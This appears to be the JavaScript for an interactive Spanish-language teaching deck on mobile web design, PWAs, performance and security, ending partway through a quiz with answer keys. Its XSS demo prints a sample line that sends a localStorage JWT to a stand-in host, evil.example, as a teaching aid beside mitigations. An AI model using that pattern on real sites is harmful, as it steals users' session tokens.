(function () {
  'use strict';

  var $ = function (sel, root) { return (root || document).querySelector(sel); };
  var $$ = function (sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); };

  var deck = $('#deck');
  var slides = Array.prototype.slice.call(deck.children);
  var pager = $('#pager');
  var counter = $('#counter');
  var prevBtn = $('#prevBtn');
  var nextBtn = $('#nextBtn');
  var progressBar = $('#progressBar');
  var stage = $('#stage');
  var quizView = $('#quizView');
  var current = 0;
  var quizOpen = false;

  /* ==========================================================
     NAVEGACIÓN
     ========================================================== */

  slides.forEach(function (slide, i) {
    slide.setAttribute('role', 'group');
    slide.setAttribute('aria-roledescription', 'diapositiva');
    if (!slide.getAttribute('aria-label')) {
      slide.setAttribute('aria-label', 'Diapositiva ' + (i + 1) + ' de ' + slides.length);
    }
    var dot = document.createElement('button');
    dot.type = 'button';
    dot.className = 'dot';
    dot.setAttribute('aria-label', 'Ir a la diapositiva ' + (i + 1));
    dot.addEventListener('click', function () { goTo(i); });
    pager.appendChild(dot);
  });
  var dots = Array.prototype.slice.call(pager.children);

  function render(i) {
    slides.forEach(function (slide, idx) {
      var active = idx === i;
      slide.classList.toggle('active', active);
      slide.setAttribute('aria-hidden', active ? 'false' : 'true');
      if ('inert' in slide) { slide.inert = !active; }
      if (!active) { slide.scrollTop = 0; }
    });
    dots.forEach(function (dot, idx) {
      dot.classList.toggle('active', idx === i);
      if (idx === i) { dot.setAttribute('aria-current', 'true'); }
      else { dot.removeAttribute('aria-current'); }
    });
    counter.textContent = (i + 1) + ' / ' + slides.length;
    progressBar.style.width = (((i + 1) / slides.length) * 100) + '%';
    var accent = getComputedStyle(slides[i]).getPropertyValue('--accent');
    if (accent && accent.trim()) {
      document.documentElement.style.setProperty('--accent', accent.trim());
    }
    prevBtn.disabled = i === 0;
    nextBtn.disabled = i === slides.length - 1;
  }

  function goTo(i) {
    if (i < 0 || i >= slides.length) { return; }
    if (i === current) {
      var inner = slides[i].querySelector('.slide-scroll');
      if (inner) { inner.scrollTo({ top: 0, behavior: 'smooth' }); }
      return;
    }
    current = i;
    deck.style.transform = 'translateX(-' + (i * 100) + '%)';
    render(i);
  }

  function next() { goTo(current + 1); }
  function prev() { goTo(current - 1); }

  prevBtn.addEventListener('click', prev);
  nextBtn.addEventListener('click', next);

  var startBtn = $('#startBtn');
  if (startBtn) { startBtn.addEventListener('click', function () { goTo(1); }); }

  var jumpMap = { 0: 0, 1: 1, 2: 4, 3: 6, 4: 9, 5: 11 };
  $$('[data-jump]').forEach(function (btn) {
    btn.addEventListener('click', function () {
      var key = Number(btn.getAttribute('data-jump'));
      if (key === 0) { goTo(0); return; }
      if (Object.prototype.hasOwnProperty.call(jumpMap, key)) { goTo(jumpMap[key]); }
    });
  });

  document.addEventListener('keydown', function (e) {
    var infoModal = $('#infoModal');
    if (e.key === 'Escape') {
      if (infoModal && infoModal.classList.contains('open')) { closeModal(); return; }
      return;
    }
    if (quizOpen) { return; }
    var t = e.target;
    var typing = t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT' || t.isContentEditable);
    if (typing) { return; }
    if (t && t.tagName === 'BUTTON' && (e.key === ' ' || e.key === 'Spacebar')) { return; }
    switch (e.key) {
      case 'ArrowRight':
      case 'PageDown':
        e.preventDefault(); next(); break;
      case 'ArrowLeft':
      case 'PageUp':
        e.preventDefault(); prev(); break;
      case ' ':
        e.preventDefault(); next(); break;
      case 'Home':
        e.preventDefault(); goTo(0); break;
      case 'End':
        e.preventDefault(); goTo(slides.length - 1); break;
      case 'f':
      case 'F':
        if (!e.ctrlKey && !e.metaKey && !e.altKey) { e.preventDefault(); toggleFs(); }
        break;
    }
  });

  /* ==========================================================
     PANTALLA COMPLETA
     ========================================================== */
  var fsBtn = $('#fsBtn');

  function fsSupported() {
    return !!(document.documentElement.requestFullscreen || document.documentElement.webkitRequestFullscreen);
  }
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement);
  }
  function toggleFs() {
    if (!fsSupported()) { return; }
    if (isFullscreen()) {
      if (document.exitFullscreen) { document.exitFullscreen(); }
      else if (document.webkitExitFullscreen) { document.webkitExitFullscreen(); }
    } else {
      var el = document.documentElement;
      if (el.requestFullscreen) { el.requestFullscreen(); }
      else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
    }
  }
  function syncFsBtn() {
    var on = isFullscreen();
    fsBtn.classList.toggle('fs-on', on);
    fsBtn.setAttribute('aria-pressed', String(on));
    fsBtn.setAttribute('aria-label', on ? 'Salir de pantalla completa (F)' : 'Pantalla completa (F)');
  }
  fsBtn.addEventListener('click', toggleFs);
  document.addEventListener('fullscreenchange', syncFsBtn);
  document.addEventListener('webkitfullscreenchange', syncFsBtn);
  syncFsBtn();

  /* ==========================================================
     GESTOS TÁCTILES
     ========================================================== */
  var x0 = null;
  var y0 = null;
  deck.addEventListener('touchstart', function (e) {
    if (quizOpen) { return; }
    x0 = e.touches[0].clientX;
    y0 = e.touches[0].clientY;
  }, { passive: true });

  deck.addEventListener('touchmove', function (e) {
    if (x0 === null || quizOpen) { return; }
    var dx = e.touches[0].clientX - x0;
    var dy = e.touches[0].clientY - y0;
    if (Math.abs(dx) > 14 && Math.abs(dx) > Math.abs(dy) * 1.25) { e.preventDefault(); }
  }, { passive: false });

  deck.addEventListener('touchend', function (e) {
    if (x0 === null) { return; }
    var dx = e.changedTouches[0].clientX - x0;
    var dy = e.changedTouches[0].clientY - y0;
    if (!quizOpen && Math.abs(dx) > 48 && Math.abs(dx) > Math.abs(dy) * 1.25) {
      if (dx < 0) { next(); } else { prev(); }
    }
    x0 = y0 = null;
  });

  /* ==========================================================
     ACORDEONES
     ========================================================== */
  $$('.acc-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
      var panel = document.getElementById(btn.getAttribute('aria-controls'));
      if (!panel) { return; }
      var open = btn.getAttribute('aria-expanded') === 'true';
      btn.setAttribute('aria-expanded', String(!open));
      panel.hidden = open;
    });
  });

  /* ==========================================================
     PESTAÑAS
     ========================================================== */
  $$('[role="tablist"]').forEach(function (list) {
    var tabs = $$('[role="tab"]', list);
    function select(tab) {
      tabs.forEach(function (t) {
        var on = t === tab;
        t.setAttribute('aria-selected', String(on));
        t.tabIndex = on ? 0 : -1;
        var panel = document.getElementById(t.getAttribute('aria-controls'));
        if (panel) { panel.hidden = !on; }
      });
    }
    tabs.forEach(function (tab, idx) {
      tab.addEventListener('click', function () { select(tab); });
      tab.addEventListener('keydown', function (e) {
        var target = null;
        if (e.key === 'ArrowRight') { target = tabs[(idx + 1) % tabs.length]; }
        if (e.key === 'ArrowLeft') { target = tabs[(idx - 1 + tabs.length) % tabs.length]; }
        if (e.key === 'Home') { target = tabs[0]; }
        if (e.key === 'End') { target = tabs[tabs.length - 1]; }
        if (target) { e.preventDefault(); target.focus(); select(target); }
      });
    });
  });

  /* ==========================================================
     REVEAL GENÉRICO (nodos SVG y tarjetas)
     ========================================================== */
  $$('[data-reveal]').forEach(function (set) {
    var triggers = $$('button[data-key], g[data-key]', set);
    var panels = $$('.reveal-panel', set);
    if (!triggers.length || !panels.length) { return; }

    function activate(key) {
      triggers.forEach(function (t) {
        var on = t.getAttribute('data-key') === key;
        t.setAttribute('aria-pressed', String(on));
      });
      panels.forEach(function (p) {
        p.classList.toggle('is-on', p.getAttribute('data-panel') === key);
      });
    }

    triggers.forEach(function (trigger) {
      trigger.addEventListener('click', function () { activate(trigger.getAttribute('data-key')); });
      trigger.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') {
          e.preventDefault();
          activate(trigger.getAttribute('data-key'));
        }
      });
    });
  });

  /* Selector de ecosistemas: aro y leyenda sincronizados */
  (function () {
    var num = $('#donutNum');
    var lbl = $('#donutLbl');
    var labels = {
      android: ['72.4%', 'Android · mundial'],
      ios: ['27.5%', 'iOS · mundial'],
      other: ['0.1%', 'SO ligeros · mundial']
    };
    if (!num) { return; }
    function sync(key) {
      if (!labels[key]) { return; }
      num.textContent = labels[key][0];
      lbl.textContent = labels[key][1];
    }
    $$('.donut-seg').forEach(function (seg) {
      seg.addEventListener('click', function () {
        var key = seg.getAttribute('data-key');
        var legend = document.querySelector('.legend-item[data-key="' + key + '"]');
        if (legend) { legend.click(); }
        sync(key);
      });
    });
    $$('.legend-item[data-key]').forEach(function (item) {
      item.addEventListener('click', function () { sync(item.getAttribute('data-key')); });
    });
  })();

  /* ==========================================================
     MODAL · VISTA MÓVIL / INFO
     ========================================================== */
  var infoModal = $('#infoModal');
  var infoBtn = $('#infoBtn');
  var infoClose = $('#infoClose');
  var lastFocus = null;

  function openModal() {
    lastFocus = document.activeElement;
    infoModal.classList.add('open');
    infoModal.setAttribute('aria-hidden', 'false');
    if ('inert' in stage) { stage.inert = true; }
    if (infoClose) { infoClose.focus(); }
  }
  function closeModal() {
    infoModal.classList.remove('open');
    infoModal.setAttribute('aria-hidden', 'true');
    if ('inert' in stage) { stage.inert = false; }
    if (lastFocus && typeof lastFocus.focus === 'function') { lastFocus.focus(); }
  }
  if (infoBtn) { infoBtn.addEventListener('click', openModal); }
  if (infoClose) { infoClose.addEventListener('click', closeModal); }
  var infoOk = $('#infoOk');
  if (infoOk) { infoOk.addEventListener('click', closeModal); }
  infoModal.addEventListener('click', function (e) {
    if (e.target === infoModal) { closeModal(); }
  });

  /* ==========================================================
     1.3 · INSPECTOR DE VIEWPORT
     ========================================================== */
  (function () {
    var phone = $('#vpPhone');
    if (!phone) { return; }
    var screenEl = phone.querySelector('.vp-screen');
    var tag = $('#vpTag');
    $$('[data-vp]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var dvh = btn.getAttribute('data-vp') === 'dvh';
        $$('[data-vp]').forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
        phone.classList.toggle('dvh', dvh);
        if (screenEl) { screenEl.classList.toggle('dvh', dvh); }
        if (tag) { tag.textContent = dvh ? '100dvh · altura real' : '100vh · barras superpuestas'; }
      });
    });
  })();

  /* ==========================================================
     3.1 · SIMULADOR RWD / AWD
     ========================================================== */
  (function () {
    var frame = $('#rwdFrame');
    if (!frame) { return; }
    var grid = $('#rwdGrid');
    var caption = $('#rwdCaption');
    var modeChip = $('#rwdMode');
    var widthChip = $('#rwdWidth');
    var explain = $('#rwdExplain');
    var state = { vw: 'mobile', mode: 'rwd' };
    var widths = { mobile: '36%', tablet: '66%', desktop: '100%' };
    var px = { mobile: '340 px', tablet: '620 px', desktop: '1080 px' };

    function update() {
      var cols = state.mode === 'rwd'
        ? { mobile: 1, tablet: 2, desktop: 3 }[state.vw]
        : 2;
      frame.style.width = widths[state.vw];
      grid.style.gridTemplateColumns = 'repeat(' + cols + ', minmax(0, 1fr))';
      frame.style.borderColor = state.mode === 'awd' ? 'var(--ios-orange)' : '';
      caption.textContent = px[state.vw] + ' · ' + cols + ' columna' + (cols > 1 ? 's' : '');
      modeChip.textContent = state.mode === 'rwd' ? 'RWD · cuadrícula fluida' : 'AWD · layout fijo';
      widthChip.textContent = 'ancho ' + px[state.vw];
      explain.innerHTML = state.mode === 'rwd'
        ? 'Las columnas se recalculan con <span class="mono">minmax()</span> y <span class="mono">auto-fit</span>: el layout respira en cualquier punto intermedio.'
        : 'El layout saltó a <strong>2 columnas fijas</strong> en el breakpoint. En 340 px el contenido queda comprimido y aparece espacio muerto: eso es AWD.';
    }

    $$('[data-vw]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        state.vw = btn.getAttribute('data-vw');
        $$('[data-vw]').forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
        update();
      });
    });
    $$('[data-mode]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        state.mode = btn.getAttribute('data-mode');
        $$('[data-mode]').forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
        update();
      });
    });
    update();
  })();

  /* ==========================================================
     3.3 · MATRIZ DE CRITERIOS
     ========================================================== */
  (function () {
    var note = $('#critNote');
    if (!note) { return; }
    var notes = {
      perf: '<strong>Rendimiento:</strong> Swift/Kotlin compilan a nativo y dibujan con acceso directo a GPU. Un WebView añade una capa de composición y un puente; en animaciones complejas o juego, la diferencia se nota.',
      cost: '<strong>Costo:</strong> dos bases de código, dos equipos y dos ciclos de QA frente a un único código HTML/CSS/JS reutilizable. La deuda aparece cuando un plugin nativo necesita mantenimiento.',
      ttm: '<strong>Time-to-Market:</strong> el enfoque híbrido permite publicar la misma build en iOS y Android y actualizar contenido sin revisión de tienda. La nativa exige dos releases coordinados.',
      hw: '<strong>Acceso a hardware:</strong> la nativa expone todas las APIs del sistema con tipado y estabilidad. La híbrida depende de plugins y del puente, con latencia y cobertura desiguales.'
    };
    $$('[data-crit]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var key = btn.getAttribute('data-crit');
        $$('[data-crit]').forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
        $$('.matrix tbody tr').forEach(function (row) {
          row.classList.toggle('is-on', row.getAttribute('data-row') === key);
        });
        if (notes[key]) { note.innerHTML = notes[key]; }
      });
    });
  })();

  /* ==========================================================
     5.1 · SIMULADOR DE RED
     ========================================================== */
  (function () {
    var root = $('#netFlow');
    if (!root) { return; }
    var netStatus = $('#netStatus');
    var netLabel = $('#netLabel');
    var toggle = $('#offlineToggle');
    var sendBtn = $('#sendOrderBtn');
    var queue = $('#syncQueue');
    var consoleEl = $('#netConsole');
    var stateChip = $('#flowState');
    var mode = 'legacy';
    var order = 4800;

    function log(html, cls) {
      var line = document.createElement('div');
      line.className = cls || '';
      line.innerHTML = html;
      consoleEl.appendChild(line);
      while (consoleEl.children.length > 6) { consoleEl.removeChild(consoleEl.firstChild); }
      consoleEl.scrollTop = consoleEl.scrollHeight;
    }

    function online() {
      return !toggle.checked && navigator.onLine !== false;
    }

    function refreshStatus() {
      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      var type = conn && conn.effectiveType ? ' · ' + String(conn.effectiveType).toUpperCase() : '';
      var isOn = online();
      netLabel.textContent = (isOn ? 'En línea' : 'Sin conexión') + type;
      netStatus.classList.toggle('off', !isOn);
    }

    function queueItem() {
      var placeholder = queue.querySelector('.micro');
      if (placeholder) { placeholder.remove(); }
      var id = ++order;
      var item = document.createElement('div');
      item.className = 'queue-item';
      item.innerHTML = '<svg class="ic" aria-hidden="true"><use href="#i-refresh"></use></svg> Pedido #' + id + ' · en cola';
      queue.appendChild(item);
      return { el: item, id: id };
    }

    function flushQueue() {
      var items = $$('.queue-item:not(.done)', queue);
      if (!items.length) { return; }
      items.forEach(function (item) {
        item.classList.add('done');
        item.innerHTML = item.innerHTML.replace('en cola', 'sincronizado · 200 OK');
      });
      log('<span class="ok">Background Sync:</span> ' + items.length + ' pedido(s) enviados al recuperar la conexión', 'ok');
      stateChip.textContent = 'En línea · cola sincronizada';
      root.classList.remove('is-cache', 'is-offline');
    }

    document.addEventListener('online', function () {
      refreshStatus();
      if (online()) { flushQueue(); }
    });
    document.addEventListener('offline', refreshStatus);

    toggle.addEventListener('change', function () {
      refreshStatus();
      if (online()) {
        root.classList.remove('is-offline');
        var pending = $$('.queue-item:not(.done)', queue).length;
        if (pending) { flushQueue(); }
        else { stateChip.textContent = 'En línea · sin solicitudes'; }
      } else {
        log('<span class="warn">Red perdida.</span> El SW mantiene la app viva desde caché.', 'warn');
        stateChip.textContent = 'Sin conexión';
      }
    });

    $$('[data-netmode]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        mode = btn.getAttribute('data-netmode');
        $$('[data-netmode]').forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
        root.classList.remove('is-offline', 'is-cache');
        stateChip.textContent = mode === 'offline' ? 'Offline-First activo' : 'Modo tradicional';
      });
    });

    sendBtn.addEventListener('click', function () {
      var isOn = online();
      if (isOn) {
        root.classList.remove('is-offline', 'is-cache');
        log('<span class="ok">POST /pedido → 200 OK</span> · ' + (mode === 'offline' ? 'red disponible, SW actualiza caché' : 'sin intervención del SW'), 'ok');
        stateChip.textContent = 'En línea · 200 OK';
        flushQueue();
        return;
      }
      if (mode === 'legacy') {
        root.classList.add('is-offline');
        root.classList.remove('is-cache');
        stateChip.textContent = 'Sin señal · fallo de red';
        log('<span class="err">POST /pedido → 503 / Failed to fetch</span>', 'err');
        log('<span class="err">La UI quedó bloqueada esperando respuesta.</span>', 'err');
        return;
      }
      root.classList.remove('is-offline');
      root.classList.add('is-cache');
      var entry = queueItem();
      log('<span class="warn">SW intercepta:</span> responde desde Cache API al instante', 'warn');
      log('<span class="ok">Pedido #' + entry.id + ' guardado en IndexedDB y encolado para Background Sync</span>', 'ok');
      stateChip.textContent = 'Offline · respuesta desde caché';
    });

    refreshStatus();
  })();

  /* ==========================================================
     5.2 · RENDIMIENTO E INP
     ========================================================== */
  (function () {
    var heavyBtn = $('#heavyBtn');
    if (!heavyBtn) { return; }
    var splitBtn = $('#splitBtn');
    var tapBtn = $('#tapInterfaceBtn');
    var value = $('#inpValue');
    var readout = $('#inpReadout');
    var block = $('#threadBlock');
    var blockLbl = $('#threadBlockLbl');
    var threadMs = $('#threadMs');
    var threadState = $('#threadState');
    var thermFill = $('#thermFill');
    var thermDot = $('#thermDot');
    var thermLabel = $('#thermLabel');
    var battFill = $('#battFill');
    var battLabel = $('#battLabel');
    var consoleEl = $('#perfConsole');
    var busy = false;
    var busyTimer = null;

    function log(html, cls) {
      var line = document.createElement('div');
      line.className = cls || '';
      line.innerHTML = html;
      consoleEl.appendChild(line);
      while (consoleEl.children.length > 4) { consoleEl.removeChild(consoleEl.firstChild); }
      consoleEl.scrollTop = consoleEl.scrollHeight;
    }

    function setHeat(level) {
      var states = [
        { y: 20, h: 5, color: '#34C759', text: 'Temp. normal', batt: '82%', battW: '82%', battC: '#34C759' },
        { y: 14, h: 11, color: '#FF9F0A', text: 'Templado · throttling leve', batt: '78%', battW: '78%', battC: '#FF9F0A' },
        { y: 7, h: 18, color: '#FF3B30', text: 'Caliente · throttling activo', batt: '71%', battW: '71%', battC: '#FF3B30' }
      ];
      var s = states[level] || states[0];
      thermFill.setAttribute('y', s.y);
      thermFill.setAttribute('height', s.h);
      thermFill.setAttribute('fill', s.color);
      thermDot.setAttribute('fill', s.color);
      thermLabel.textContent = s.text;
      battFill.style.width = s.battW;
      battFill.style.background = s.battC;
      battLabel.textContent = s.batt;
    }

    function setInp(ms, good) {
      value.textContent = String(ms);
      readout.classList.remove('good', 'bad', 'warn');
      readout.classList.add(good ? 'good' : 'bad');
    }

    heavyBtn.addEventListener('click', function () {
      busy = true;
      clearTimeout(busyTimer);
      block.classList.remove('clear');
      block.style.width = '100%';
      blockLbl.textContent = '800 ms';
      threadMs.textContent = '800 ms bloqueados';
      threadState.textContent = 'Hilo bloqueado';
      setHeat(2);
      log('<span class="err">Tarea larga de 800 ms en el Main Thread: no hay pintado ni respuesta táctil.</span>', 'err');
      busyTimer = setTimeout(function () {
        busy = false;
        threadState.textContent = 'Hilo liberado';
      }, 800);
    });

    splitBtn.addEventListener('click', function () {
      busy = false;
      clearTimeout(busyTimer);
      block.classList.add('clear');
      block.style.width = '9%';
      blockLbl.textContent = '';
      threadMs.textContent = '18 ms en total';
      threadState.textContent = 'Tareas fragmentadas';
      setInp(18, true);
      setHeat(0);
      log('<span class="ok">Code Splitting: la ruta crítica se divide en tareas cortas; la UI responde en 18 ms.</span>', 'ok');
    });

    tapBtn.addEventListener('click', function () {
      if (busy) {
        setInp(820, false);
        log('<span class="err">INP: 820 ms · Mala respuesta (&gt; 200 ms). El toque esperó a que terminara la tarea de 800 ms.</span>', 'err');
        setHeat(2);
      } else {
        setInp(18, true);
        log('<span class="ok">INP: 18 ms · Buena respuesta. El hilo está disponible para atender el toque.</span>', 'ok');
      }
    });

    /* Tarjetas Core Web Vitals: detalle de cada umbral */
    $$('.cwv-card').forEach(function (card) {
      card.addEventListener('click', function () {
        var key = card.getAttribute('data-cwv');
        $$('.cwv-card').forEach(function (c) {
          c.setAttribute('aria-pressed', String(c === card));
          c.classList.toggle('is-on', c === card);
        });
        var text = {
          lcp: 'LCP mide cuándo se pinta el elemento de contenido más grande. Objetivo: < 2.5 s. Se mejora con prioridad de recursos, AVIF/WebP y eliminando bloqueos de renderizado.',
          inp: 'INP mide la latencia de las interacciones. Objetivo: < 200 ms. Un bloqueo de 800 ms produce ~820 ms de INP; se corrige dividiendo tareas y cediendo el hilo.',
          cls: 'CLS mide el desplazamiento inesperado del layout. Objetivo: < 0.1. Reserva dimensiones para imágenes, anuncios y fuentes antes de que carguen.'
        }[key];
        log(text || '', 'muted-c');
      });
    });
  })();

  /* ==========================================================
     5.3 · CONTEXTO SEGURO, PERMISOS Y XSS
     ========================================================== */
  (function () {
    var badge = $('#secureBadge');
    if (!badge) { return; }
    if (window.isSecureContext) {
      badge.classList.add('ok');
      badge.innerHTML = '<svg class="ic" aria-hidden="true"><use href="#i-lock"></use></svg> Contexto seguro · HTTPS';
    } else {
      badge.classList.add('bad');
      badge.innerHTML = '<svg class="ic" aria-hidden="true"><use href="#i-alert"></use></svg> Sin contexto seguro · usa HTTPS';
    }

    var permBtn = $('#permBtn');
    var permResult = $('#permResult');
    if (permBtn) {
      permBtn.addEventListener('click', function () {
        permResult.innerHTML = '<span class="chip">consultando…</span><span class="small muted">Leyendo el estado sin lanzar el prompt.</span>';
        var done = function (html) { permResult.innerHTML = html; };
        try {
          if (!navigator.permissions || !navigator.permissions.query) {
            throw new Error('Permissions API no disponible');
          }
          navigator.permissions.query({ name: 'geolocation' }).then(function (status) {
            var map = {
              granted: ['ok', 'granted', 'El usuario ya concedió ubicación para este origen.'],
              prompt: ['warn', 'prompt', 'El navegador preguntará en el próximo uso; el patrón Just-in-Time puede pedirlo entonces.'],
              denied: ['bad', 'denied', 'Bloqueado. La página no puede volver a mostrar el prompt; ofrece una alternativa manual.']
            };
            var v = map[status.state] || ['', status.state, ''];
            done('<span class="chip ' + v[0] + '">' + v[1] + '</span><span class="small muted">' + v[2] + '</span>');
          }).catch(function () {
            done('<span class="chip warn">no disponible</span><span class="small muted">El navegador no expone el estado. Respaldo: pide el permiso al usar la geolocalización y captura el error con try/catch.</span>');
          });
          return;
        } catch (err) {
          done('<span class="chip warn">API restringida</span><span class="small muted">Respaldo activo: consulta falló (<span class="mono">' + (err && err.name ? err.name : 'Error') + '</span>). Solicita el permiso solo al usar la función y maneja el rechazo.</span>');
        }
      });
    }

    var xssBtn = $('#xssBtn');
    if (xssBtn) {
      xssBtn.addEventListener('click', function () {
        var local = $('#xssLocal');
        var cookie = $('#xssCookie');
        var localToken = $('#xssLocalToken');
        var localMsg = $('#xssLocalMsg');
        var cookieMsg = $('#xssCookieMsg');
        var logEl = $('#xssConsole');
        local.classList.add('leaked');
        cookie.classList.add('blocked');
        localToken.textContent = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyLTEyMyJ9.firma_expuesta';
        localMsg.textContent = 'Token expuesto: document.cookie / localStorage';
        cookieMsg.textContent = 'Acceso bloqueado por el navegador';
        logEl.innerHTML = '<div class="err">XSS: fetch("//evil.example?t=" + localStorage.getItem("jwt")) → 200 OK</div>' +
          '<div class="ok">Cookie HttpOnly: document.cookie no la contiene; el script no puede leerla.</div>' +
          '<div class="warn">Mitigación: CSP, escapar salida y refresh tokens en cookie HttpOnly + SameSite.</div>';
      });
    }
  })();

  /* ==========================================================
     5.4 · BLINDAJE DE WEBVIEW
     ========================================================== */
  (function () {
    var toggle = $('#shieldToggle');
    if (!toggle) { return; }
    var svg = $('#wvSvg');
    var badge = $('#shieldBadge');
    var status = $('#wvStatus');
    var logEl = $('#wvLog');
    var attempts = 0;

    function addLog(text, kind) {
      attempts += 1;
      var line = document.createElement('div');
      line.className = 'line';
      var icon = kind === 'blocked' ? 'i-shield' : 'i-alert';
      line.innerHTML = '<svg class="ic" aria-hidden="true" style="color:' + (kind === 'blocked' ? '#34C759' : '#FF3B30') + '"><use href="#' + icon + '"></use></svg><span class="micro">' + text + '</span>';
      logEl.appendChild(line);
      while (logEl.children.length > 4) { logEl.removeChild(logEl.firstChild); }
    }

    function syncShield() {
      var on = toggle.checked;
      svg.classList.toggle('shielded', on);
      badge.classList.toggle('on', on);
      badge.innerHTML = on
        ? '<svg class="ic" aria-hidden="true"><use href="#i-shield"></use></svg> Blindaje activo'
        : '<svg class="ic" aria-hidden="true"><use href="#i-alert"></use></svg> Sin blindaje';
      status.textContent = on ? 'Escudo en el borde del WebView' : 'Sin defensas en el borde';
      svg.classList.remove('attacking');
    }

    function attack(type) {
      svg.classList.add('attacking');
      var shielded = toggle.checked;
      if (type === 'inject') {
        status.textContent = shielded ? 'Blocked by CSP directive' : 'Script externo ejecutado';
        addLog(shielded
          ? 'Bloqueado: script inline/externo rechazado por <span class="mono">script-src \'self\'</span>.'
          : 'Alerta: script de origen desconocido cruzó el puente y alcanzó APIs nativas.', shielded ? 'blocked' : 'danger');
      } else {
        status.textContent = shielded ? 'Blocked by allowlist' : 'Redirección abierta';
        addLog(shielded
          ? 'Bloqueado: dominio fuera de la allowlist; navegación cancelada antes del JS Bridge.'
          : 'Alerta: redirección a dominio malicioso permitida dentro del WebView.', shielded ? 'blocked' : 'danger');
      }
    }

    toggle.addEventListener('change', syncShield);
    var injectBtn = $('#injectBtn');
    var redirectBtn = $('#redirectBtn');
    if (injectBtn) { injectBtn.addEventListener('click', function () { attack('inject'); }); }
    if (redirectBtn) { redirectBtn.addEventListener('click', function () { attack('redirect'); }); }
    syncShield();
  })();

  /* ==========================================================
     DINÁMICA POR EQUIPOS · 5 PREGUNTAS · CRONÓMETRO DE 90 s
     ========================================================== */
  var QUESTION_SECONDS = 90;
  var LETTERS = ['A', 'B', 'C', 'D'];
  var QUESTIONS = [
    {
      tag: 'Bloque 1 · Dispositivos y diseño web',
      title: 'Un formulario de reserva usa <code>height: 100vh</code> para ocupar toda la pantalla. En un iPhone, al aparecer la barra del navegador, el botón «Confirmar» queda tapado y el usuario no puede terminar. ¿Cuál es la mejor solución?',
      options: [
        'Cambiar la altura a <code>100dvh</code> y usar botones de al menos 44×44 px, el tamaño táctil recomendado.',
        'Mantener <code>100vh</code> y reducir los botones a 24 px para que todo quepa en la pantalla.',
        'Bloquear el zoom del navegador para que la barra de URL no cambie de tamaño.',
        'Fijar todo el contenido con <code>position: fixed</code> para que nada se mueva.'
      ],
      correct: 0,
      explain: '<code>100vh</code> toma la altura máxima del viewport y no se ajusta cuando aparece la barra del navegador; <code>100dvh</code> sigue la altura visible real. Además, un objetivo táctil de 44×44 px evita pulsaciones fallidas. Bloquear el zoom o fijar el contenido no resuelve el recorte y empeora la accesibilidad.'
    },
    {
      tag: 'Bloque 2 · Ecosistemas y motores',
      title: 'En Android puedes instalar Chrome, Firefox o Edge y cada uno usa su propio motor. En iPhone y iPad, ¿qué ocurre con todos los navegadores?',
      options: [
        'Cada navegador usa su propio motor, igual que en Android.',
        'Todos deben usar WebKit, el motor de Apple, y sus funciones dependen de la versión de iOS.',
        'Solo Safari puede abrir páginas web; los demás únicamente muestran texto.',
        'Todos usan Blink porque es el motor más popular del mundo.'
      ],
      correct: 1,
      explain: 'En iOS y iPadOS no se puede elegir motor: Safari, Chrome, Firefox y cualquier WebView usan WebKit, y sus capacidades llegan con la actualización del sistema. Por eso conviene detectar funciones y ofrecer una alternativa cuando algo no está disponible, en lugar de prometer paridad con Android.'
    },
    {
      tag: 'Bloque 3 · PWAs y apps híbridas',
      title: 'Un equipo convierte su sitio web en una PWA. ¿Qué combinación le permite abrirse sin conexión e instalarse en la pantalla de inicio?',
      options: [
        'Un Service Worker que guarda recursos en caché y un Web App Manifest con nombre, iconos y colores.',
        'Un archivo <code>robots.txt</code> y una hoja de estilos con <em>media queries</em>.',
        'Una base de datos en <code>localStorage</code> y un favicon en formato PNG.',
        'Un servidor con HTTPS y un botón que abra la tienda de aplicaciones.'
      ],
      correct: 0,
      explain: 'El Service Worker actúa como intermediario de red y guarda en caché el shell para responder sin conexión. El Web App Manifest aporta nombre, iconos, color y modo de visualización para que el navegador ofrezca la instalación. HTTPS es necesario, pero por sí solo no da offline ni instalación.'
    },
    {
      tag: 'Bloque 4 · Sectores y Web APIs',
      title: 'Una app de entregas necesita mostrar la ubicación del repartidor, tomar una foto de entrega y permitir el acceso con huella. ¿Qué APIs cubren esas funciones y qué necesitan para usarse?',
      options: [
        '<code>Geolocation API</code>, <code>MediaDevices</code> (cámara) y <code>WebAuthn</code>; requieren HTTPS y el permiso del usuario.',
        '<code>Fetch API</code>, <code>WebSocket</code> y <code>Canvas</code>; funcionan en cualquier página, incluso sin HTTPS.',
        '<code>localStorage</code>, <code>sessionStorage</code> y cookies; no necesitan permisos porque son del navegador.',
        '<code>Web Bluetooth</code>, <code>WebUSB</code> y <code>WebGL</code>; son las únicas APIs que piden permiso.'
      ],
      correct: 0,
      explain: '<code>Geolocation</code> obtiene la posición, <code>MediaDevices.getUserMedia()</code> abre la cámara y <code>WebAuthn</code> gestiona credenciales con huella o rostro. Las tres exigen un contexto seguro (HTTPS) y consentimiento: el permiso se pide cuando el usuario activa la función y debe existir una alternativa si lo deniega.'
    },
    {
      tag: 'Bloque 5 · Rendimiento y seguridad',
      title: 'Al abrir una pantalla, el JavaScript tarda 800 ms en terminar y la app se siente «pegada» al tocar. Además, el token de sesión está guardado en <code>localStorage</code>. ¿Cuál es la corrección más completa?',
      options: [
        'Mostrar un spinner para ocultar la tardanza y dejar el token en <code>localStorage</code>.',
        'Dividir el trabajo pesado y ceder el hilo principal para mejorar el INP; guardar el token en una cookie <code>HttpOnly</code> para que XSS no pueda leerlo.',
